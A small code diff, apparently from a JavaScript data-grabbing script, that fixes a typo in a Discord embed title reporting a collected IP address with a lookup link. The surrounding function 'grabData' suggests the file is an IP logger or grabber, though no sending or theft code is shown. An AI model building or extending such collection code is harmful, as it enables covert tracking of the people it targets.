@@ -54,7 +54,7 @@ const grabData = async () => {
                     content: null,
                     embeds: [
                         {
-                            title: "** ** ** **:globe_with_meridians: IP Adress: " + ip,
+                            title: "** ** ** **:globe_with_meridians: IP Address: " + ip,
                             "url": "https://whatismyipaddress.com/ip/"+ ip,
                             description: "** **",
                             "thumbnail": {
